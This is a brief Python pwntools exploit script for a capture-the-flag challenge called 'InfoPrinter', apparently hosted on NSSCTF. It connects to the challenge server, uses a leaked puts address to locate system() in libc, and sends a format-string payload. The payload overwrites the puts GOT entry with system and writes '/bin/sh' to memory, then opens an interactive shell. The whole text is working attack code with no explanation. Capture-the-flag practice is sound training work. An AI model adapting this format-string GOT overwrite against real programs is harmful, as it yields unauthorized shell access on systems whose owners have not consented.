from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node2.anna.nssctf.cn",28317)
# io=process("./InfoPrinter")
elf=ELF("./InfoPrinter")
libc=ELF("./libc-2.31.so")

puts_got=elf.got[b"puts"]
xx=0x403878

io.recvuntil(b"key ")
leak_addr=int(io.recv(14),16)-libc.sym[b"puts"]
print("leak_addr: "+hex(leak_addr))
sys_addr=leak_addr+libc.sym[b"system"]
# str_bin_sh=leak_addr+next(libc.search(b"/bin/sh"))


payload=fmtstr_payload(6,{puts_got:sys_addr,xx:b"/bin/sh\x00"})
io.sendline(payload)

io.interactive()